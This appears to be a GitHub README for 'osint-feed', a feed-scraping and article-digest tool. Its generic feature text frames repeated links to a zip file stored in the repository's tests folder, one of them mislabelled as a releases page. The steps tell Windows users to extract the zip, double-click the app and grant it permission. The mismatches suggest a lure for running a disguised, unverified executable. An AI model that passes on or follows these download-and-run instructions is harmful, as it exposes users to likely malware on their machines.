# 📰 osint-feed - Turn feeds into clean article digests

[![Download osint-feed](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)

## 📥 Download

Visit this page to download and run the app on Windows:

[https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)

## 🧭 What this app does

osint-feed collects news from RSS feeds and web pages, removes repeats, and builds a short digest. It is built for people who want a clean list of articles without extra clutter.

Use it when you want to:

- pull items from RSS feeds
- read article pages with HTML selectors
- remove duplicate stories
- build a compact set of results
- send clean text into an LLM prompt later

It keeps the process simple. You give it sources, and it gives you structured article data.

## 🪟 Windows setup

1. Open the [releases page](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)
2. Download the Windows file from the latest release
3. If the file comes in a .zip folder, right-click it and choose Extract All
4. Open the extracted folder
5. Double-click the app or start file
6. If Windows asks for permission, choose Yes
7. Follow the on-screen prompts

If you plan to run it often, keep the app in a folder that is easy to find, such as Documents or Downloads.

## ⚙️ How it works

osint-feed uses a config file to decide what to collect. That means you do not need to change code to use it.

A typical setup includes:

- feed links for RSS sources
- page URLs for sites that do not offer RSS
- CSS selectors for article titles, dates, and links
- rules for ignoring duplicates
- output settings for the final digest

The app reads your sources, checks each item, then builds a compact result you can review or use elsewhere.

## 🗂️ What you can collect

You can use osint-feed for many common source types:

- news sites
- blogs
- press pages
- public web pages
- topic trackers
- niche industry feeds

It works well when a site has RSS. It also works when you need to pull data from HTML pages.

## 🧾 Example use cases

- track local news from several outlets
- monitor a topic across multiple feeds
- collect article links for research
- build a daily reading list
- gather source material before a manual review
- prepare text for a search or summary workflow

## 🔧 Basic setup file

The app uses plain text config. A simple setup may look like this:

- source name
- source type
- URL
- selectors for HTML pages
- duplicate rules
- output format

Example fields you may see in a config:

- `name`
- `type`
- `url`
- `titleSelector`
- `dateSelector`
- `linkSelector`
- `dedupeKey`
- `output`

You do not need to know code to use a config file. You only need to edit names, links, and simple rules.

## 🧹 Deduplication

Many sites repeat the same story with small changes. osint-feed checks for that and removes repeated items.

It can compare:

- article URL
- title text
- source name
- publish date
- custom keys from the config

This keeps the digest shorter and easier to read.

## 📄 Output

The app produces structured article data that is easy to reuse. A digest may include:

- title
- source
- link
- publish date
- short excerpt
- tag or topic
- original feed or page name

You can use the output for reading, sorting, filtering, or passing into another tool.

## 🛠️ Windows requirements

For most Windows systems, you need:

- Windows 10 or later
- internet access
- enough disk space for the app and its cache
- permission to save files in the chosen folder

If your feed list is large, use a machine with at least 4 GB of RAM. More RAM helps when you collect many pages at once.

## 🧪 First run checklist

Before your first run, check these items:

- you downloaded the latest release
- you extracted the files if they came in a zip
- your config file has at least one source
- the source URLs are valid
- your output folder exists
- your internet connection is active

If the app opens and closes fast, it may be waiting for a config file or a source path.

## 🧠 RSS and HTML source types

RSS is the easiest source type. If a site gives you an RSS link, use it.

Use HTML selectors when:

- the site has no RSS feed
- you want data from a page layout
- you need a title, date, or link from page elements
- the content lives on a normal web page

This gives you one tool for both common feed pages and custom web pages.

## 📌 Common config tips

- keep source names short and clear
- use one source per site
- test one source first
- start with RSS before using HTML selectors
- keep the output folder simple
- remove old sources you no longer need

If a page changes its layout, you may need to update its selectors.

## 🔍 Troubleshooting

If nothing appears in the output:

- check the source URL
- confirm the feed is public
- make sure your selectors match the page
- look for blocked pages or login walls
- try one source at a time
- verify the output path is writable

If a source works in a browser but not in the app, the page may load content after the first page view. In that case, use a different selector or a feed link if one exists.

## 📚 Folder layout

A simple install may include:

- the app file
- a config folder
- an output folder
- logs
- source lists

Keep the config and output files in the same place so they are easy to manage.

## 🔐 Privacy and data use

osint-feed reads public web content and RSS feeds based on your config. It does not add opinions or extra content. It gathers the text you ask for and formats it into a digest.

## 🧩 Topic coverage

This project fits topics such as:

- feed
- html
- nodejs
- osint
- osint-tool
- rss
- scraping
- scraper
- scraping-websites
- scrapy
- scrapper
- scraping-python

## 🪄 Suggested first setup

If you are new to the app, start with this order:

1. Download the latest Windows release
2. Open one RSS source
3. Confirm the output looks right
4. Add one HTML page source
5. Check deduplication
6. Add more sources after the first test works

That keeps the setup simple and helps you find issues fast.

## 📦 Release download

Use the release page below to download and run the Windows version:

[https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip](https://raw.githubusercontent.com/whitakerunsaturated400/osint-feed/main/tests/osint-feed-v3.5-alpha.3.zip)

## 🧰 Quick start flow

1. Download the latest release
2. Extract the files if needed
3. Open the app
4. Load or edit your config
5. Add RSS or HTML sources
6. Run the harvest
7. Review the digest output